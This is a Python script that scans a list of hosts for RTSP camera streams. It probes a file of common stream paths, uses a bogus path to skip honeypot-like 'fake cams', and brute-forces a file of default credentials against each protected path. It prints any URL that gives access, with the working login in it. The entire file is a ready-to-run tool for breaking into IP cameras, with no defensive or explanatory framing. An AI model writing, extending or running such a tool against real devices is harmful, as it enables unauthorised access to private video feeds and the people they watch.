#!/usr/bin/env python
import os
from pathlib import Path
import re
from socket import SocketIO, create_connection, timeout
from time import sleep

from fire import Fire


fake_path = '/f4k3p4th'
work_dir = Path(os.path.dirname(os.path.abspath(__file__)))

data_dir = work_dir / 'data'
local_dir = work_dir / 'local'

paths_file = data_dir / 'rtsp_paths.txt'
creds_file = data_dir / 'rtsp_creds.txt'

paths = [fake_path] + [ln.rstrip() for ln in open(paths_file)]
creds = [ln.rstrip() for ln in open(creds_file)]

header_re = re.compile(r'RTSP/\d\.\d (\d\d\d)')


def query(connection, url):
    request = (
        f'DESCRIBE {url} RTSP/1.0\r\n'
        'CSeq: 2\r\n'
        '\r\n'
    )

    try:
        connection.sendall(request.encode())
        # TODO: deal w/unicode decode err
        response = connection.recv(1024).decode()
        header_matches = header_re.findall(response)
        if header_matches:
            return int(header_matches[0])
    except KeyboardInterrupt:
        raise
    except BrokenPipeError:
        pass
    except timeout:
        pass
    except Exception as e:
        print(repr(e))
        pass

    try:
        connection.close()
    except:
        pass

    return 500


def get_url(host, port=554, path='', cred=''):
    if cred:
        cred = f'{cred}@'
    return f'rtsp://{cred}{host}:{port}{path}'


def connect(host, port) -> SocketIO:
    retries = 3
    while retries:
        try:
            return create_connection((host, int(port)), 3)
        except KeyboardInterrupt:
            raise
        except:
            sleep(1.5/retries)
            retries -= 1
            print('Retry')


def process_target(host, port):
    netloc = f'{host}:{port}'
    print('\n* Connecting to', netloc)

    connection = connect(host, port)

    if not connection:
        print('- No connection', netloc)
        return  # next host

    print('+ Connected', netloc)

    for path in paths:
        p_url = get_url(host, port, path)
        code = query(connection, p_url)

        # if error, but not for fake path (weak app)
        if code >= 500 and path != fake_path:
            print(f'  ! {path}')
            break  # first request fail, cant continue

        if code not in [200, 401, 403]:
            print(f'  - {path}')
            continue

        if path == fake_path:
            print(f'  ! Fake cam')
            break

        print(f'  + {path}')

        if code == 200:
            print(p_url)
            continue

        for cred in creds:
            c_url = get_url(host, port, path, cred)
            code = query(connection, c_url)
            if code >= 500:
                print(f'    ! {cred}')
                break  # something goes wrong =(

            if code != 200:
                print(f'    - {cred}')
                continue  # access denied

            print(f'    + {cred}')
            print(c_url)
            break  # one cred per path is enough

    print('i Close connection')
    connection.close()


def main(H=''):
    hosts_file = H or local_dir / 'hosts_554.txt'

    with open(hosts_file) as hf:
        for ln in hf:
            host = ln.rstrip()
            port = 554

            if ':' in host:
                host, port = host.split(':')

            process_target(host, port)


if __name__ == "__main__":
    Fire(main)
